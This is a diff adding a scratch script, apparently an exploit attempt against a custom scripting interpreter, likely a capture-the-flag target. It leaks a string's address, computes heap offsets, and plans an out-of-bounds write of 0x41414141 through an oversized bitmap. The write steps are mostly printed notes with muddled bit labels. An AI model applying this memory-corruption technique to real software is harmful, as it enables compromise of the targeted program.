@@ -1,0 +1,55 @@
+print("=== Correct Bitmap Write ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapdataptr = targetaddr - 8192;
+print("Addresses:");
+print("entry_addr:");
+print(entryaddr);
+print("value_ptr_addr:");
+print(valueptraddr);
+print("bitmap_data_ptr:");
+print(bitmapdataptr);
+
+print("Creating bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Calculating coordinates:");
+int offset = valueptraddr - bitmapdataptr;
+print("offset:");
+print(offset);
+int bitindex = offset * 8;
+print("bit_index:");
+print(bitindex);
+int y = 0;
+int x = bitindex;
+print("y:");
+print(y);
+print("x:");
+print(x);
+
+print("Writing test value 0x41414141");
+print("This requires writing 64 bits");
+print("x coordinate is the bit offset (can be large!)");
+print("y coordinate wraps when x >= width");
+
+print("For 64-bit write starting at bit_index = 59712:");
+print("Write bits 0-63 starting from x=59712, y=0");
+print("When x >= 9223372036854775807, increment y and wrap x");
+
+print("Actually, let's try simpler:");
+print("Write first byte (0x41) at bit_index 59712");
+print("set(b1, 59712, 0, 1);  // Bit 0");
+print("set(b1, 59713, 0, 1);  // Bit 6");
+print("set(b1, 59714, 0, 0);  // Bit 1");
+print("... etc");
+
+print("Note: x can be large (up to INT64_MAX), not limited to 0-7!");
+print("The bit position within byte is (x % 8)");
+
